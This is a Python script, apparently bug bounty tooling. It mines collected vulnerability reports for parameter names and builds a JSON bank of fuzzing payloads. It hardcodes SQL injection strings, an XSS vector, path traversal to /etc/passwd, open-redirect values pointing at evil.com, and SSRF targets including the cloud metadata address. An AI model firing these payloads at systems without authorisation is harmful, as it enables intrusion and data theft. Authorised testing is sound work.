import os
import re
import json
from urllib.parse import quote

# ==========================================================
# PHASE 2:
# AUTO PAYLOAD INTELLIGENCE BUILDER
#
# Reads your collected bug bounty reports / chunks
# Extracts:
# - payloads
# - vulnerable params
# - bug classes
# - reusable fuzz words
#
# Output:
# collector_data/intel/payload_bank.json
# ==========================================================

# ----------------------------
# CONFIG
# ----------------------------
BASE_DIR = "collector_data"
INPUT_DIRS = [
    os.path.join(BASE_DIR, "raw"),
    os.path.join(BASE_DIR, "clean"),
    os.path.join(BASE_DIR, "chunks"),
]

OUT_DIR = os.path.join(BASE_DIR, "intel")
OUT_FILE = os.path.join(OUT_DIR, "payload_bank.json")

os.makedirs(OUT_DIR, exist_ok=True)

# ----------------------------
# REGEX PATTERNS
# ----------------------------

# URLs with params
URL_PARAM_RE = re.compile(
    r'https?://[^\s"\']+\?[^\s"\']+',
    re.I
)

# common params
PARAM_RE = re.compile(
    r'([a-zA-Z0-9_\-]{2,30})=',
    re.I
)

# quoted payloads
QUOTE_PAYLOAD_RE = re.compile(
    r'["\']([^"\']{1,250})["\']'
)

# path traversal
TRAVERSAL_RE = re.compile(
    r'(\.\./){2,}[^\s"\']+'
)

# XSS payloads
SCRIPT_RE = re.compile(
    r'<script.*?>.*?</script>',
    re.I | re.S
)

# SQLi style snippets
SQLI_RE = re.compile(
    r"(union select|or 1=1|sleep\(|benchmark\(|' or '|\" or \")",
    re.I
)

# JWT / auth params
AUTH_WORDS = [
    "token", "jwt", "auth", "session",
    "apikey", "api_key", "key"
]

# common params
GOOD_PARAMS = [
    "id", "user", "uid", "file", "path",
    "redirect", "url", "next", "return",
    "search", "query", "page", "lang",
    "email", "token", "code"
]

# ----------------------------
# HELPERS
# ----------------------------
def read_text(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except:
        return ""

def add_unique(lst, item):
    if item and item not in lst:
        lst.append(item)

# ----------------------------
# EXTRACTOR
# ----------------------------
def process_text(text, bank):
    lower = text.lower()

    # ------------------------
    # Params from URLs
    # ------------------------
    urls = URL_PARAM_RE.findall(text)

    for u in urls:
        params = PARAM_RE.findall(u)

        for p in params:
            add_unique(bank["params"], p.lower())

    # ------------------------
    # Common param words
    # ------------------------
    for p in GOOD_PARAMS:
        if p in lower:
            add_unique(bank["params"], p)

    # ------------------------
    # Auth params
    # ------------------------
    for p in AUTH_WORDS:
        if p in lower:
            add_unique(bank["params"], p)

    # ------------------------
    # Traversal payloads
    # ------------------------
    for m in TRAVERSAL_RE.findall(text):
        add_unique(bank["payloads"]["lfi"], m)

    if "/etc/passwd" in lower:
        add_unique(bank["payloads"]["lfi"], "../../../../etc/passwd")

    if "win.ini" in lower:
        add_unique(bank["payloads"]["lfi"], "../../windows/win.ini")

    # ------------------------
    # XSS payloads
    # ------------------------
    for m in SCRIPT_RE.findall(text):
        add_unique(bank["payloads"]["xss"], m[:200])

    if "onerror=" in lower:
        add_unique(
            bank["payloads"]["xss"],
            '<img src=x onerror=alert(1)>'
        )

    # ------------------------
    # SQLi payloads
    # ------------------------
    if SQLI_RE.search(text):
        add_unique(bank["payloads"]["sqli"], "'")
        add_unique(bank["payloads"]["sqli"], '"')
        add_unique(bank["payloads"]["sqli"], "' OR '1'='1")
        add_unique(bank["payloads"]["sqli"], "1 OR 1=1")
        add_unique(bank["payloads"]["sqli"], "UNION SELECT NULL")

    # ------------------------
    # Redirect payloads
    # ------------------------
    if "redirect" in lower or "returnurl" in lower:
        add_unique(bank["payloads"]["redirect"], "//evil.com")
        add_unique(bank["payloads"]["redirect"], "https://evil.com")

    # ------------------------
    # SSRF payloads
    # ------------------------
    if "ssrf" in lower:
        add_unique(bank["payloads"]["ssrf"], "http://127.0.0.1/")
        add_unique(bank["payloads"]["ssrf"], "http://169.254.169.254/")
        add_unique(bank["payloads"]["ssrf"], "http://localhost/")

# ----------------------------
# MAIN
# ----------------------------
def build_bank():
    bank = {
        "params": [],
        "payloads": {
            "sqli": [],
            "xss": [],
            "lfi": [],
            "redirect": [],
            "ssrf": []
        }
    }

    total = 0

    for folder in INPUT_DIRS:
        if not os.path.exists(folder):
            continue

        for root, _, files in os.walk(folder):
            for file in files:
                path = os.path.join(root, file)

                if not file.endswith((".txt", ".json")):
                    continue

                text = read_text(path)

                if not text:
                    continue

                process_text(text, bank)
                total += 1

    with open(OUT_FILE, "w", encoding="utf-8") as f:
        json.dump(bank, f, indent=2)

    print("=" * 60)
    print("PAYLOAD INTEL BUILT")
    print("=" * 60)
    print("Files scanned:", total)
    print("Params found :", len(bank["params"]))

    for k, v in bank["payloads"].items():
        print(f"{k.upper():10}: {len(v)} payloads")

    print("\nSaved:", OUT_FILE)

# ----------------------------
# RUN
# ----------------------------
if __name__ == "__main__":
    build_bank()